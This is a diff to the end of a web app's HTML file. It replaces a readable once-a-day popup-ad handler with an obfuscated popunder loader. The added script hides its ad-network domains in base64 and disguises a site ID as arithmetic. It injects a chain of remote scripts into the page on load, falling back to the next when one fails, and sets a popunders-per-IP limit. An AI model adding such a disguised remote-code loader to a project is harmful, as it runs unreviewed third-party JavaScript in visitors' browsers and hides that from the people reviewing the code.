@@ -3315,20 +3315,11 @@ document.getElementById('searchForm').addEventListener('submit', function(e) {
 router.init();
 BookmarkStore.updateBadge();
 HistoryStore.updateBadge();
+</script>
 
-// Popup ad: once per 24h per user, on first click
-(function() {
-    const KEY = 'popup_ad_ts';
-    const URL_ADS = 'https://t.co/PjZMxcNrWW';
-    const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
-    document.addEventListener('click', function handler(e) {
-        const last = parseInt(localStorage.getItem(KEY) || '0', 10);
-        if (Date.now() - last < TWENTY_FOUR_HOURS) return;
-        localStorage.setItem(KEY, String(Date.now()));
-        window.open(URL_ADS, '_blank');
-        document.removeEventListener('click', handler);
-    });
-})();
+<script type="text/javascript" data-cfasync="false">/*<![CDATA[/* */
+(function(){var i=window,o="b4fa840a87522150dcc93db03b19e074",b=[["siteId",818*644*741+559+413-385034163],["minBid",0],["popundersPerIP","1,1"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],z=["d3d3LmludGVsbGlwb3B1cC5jb20vdXZpei5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQveUxaTEVKL2Fjb250ZW50LXRvb2xzLm1pbi5qcw==","d3d3LmdoYWp3bm9iaGZzYi5jb20va3Zpei5jc3M=","d3d3LmJ3Z2FicGRnbS5jb20vZXEvemNvbnRlbnQtdG9vbHMubWluLmpz"],w=-1,k,x,s=function(){clearTimeout(x);w++;if(z[w]&&!(1819192184000<(new Date).getTime()&&1<w)){k=i.document.createElement("script");k.type="text/javascript";k.async=!0;var r=i.document.getElementsByTagName("script")[0];k.src="https://"+atob(z[w]);k.crossOrigin="anonymous";k.onerror=s;k.onload=function(){clearTimeout(x);i[o.slice(0,16)+o.slice(0,16)]||s()};x=setTimeout(s,5E3);r.parentNode.insertBefore(k,r)}};if(!i[o]){try{Object.freeze(i[o]=b)}catch(e){}s()}})();
+/*]]>/* */
 </script>
 
 </body>
